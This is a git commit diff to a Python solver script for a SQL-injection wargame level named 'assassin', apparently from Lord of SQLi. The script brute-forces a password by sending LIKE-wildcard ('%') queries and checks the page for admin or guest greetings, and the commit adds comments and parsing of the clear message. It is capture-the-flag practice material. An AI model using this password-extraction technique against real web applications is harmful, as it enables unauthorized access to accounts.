9dbaaa748042aabbd0f89997c74fbdc3c1e38378
yoobi <thisisyoobi@gmail.com>
2024-01-16 22:55:42 +0900

    assassin clear!

--- LOS/15_assassin/ex.py
+++ LOS/15_assassin/ex.py
@@ -1,3 +1,11 @@
+#!/usr/bin/env python3
+
+'''
+# Summary
+- use can use _ % to the like func
+'''
+
+
 import requests
 import string
 
@@ -14,9 +22,16 @@ guest_pw = ""
 while True:
     for i in string_data:
         data = "?pw={}%".format(guest_pw+i)
+        print(data)
         response = requests.get(url + data, headers=header)
         if response.text.find("Hello admin") != -1:
             print("[+] Hello admin : " + str(guest_pw+i) + "%")
+            result = response.text
+            if result.find("Clear!") != -1:
+                end = result.split("Clear!")[0].split("<h2>")[1]
+                if end.find("admin") != -1:
+                    end = result.split("Clear!")[0].split("<h2>")[2]
+                print(end+"Clear!")
             exit()
         if response.text.find("Hello guest") != -1:
             print("[+] Hello guest : " + str(guest_pw+i) + "%")
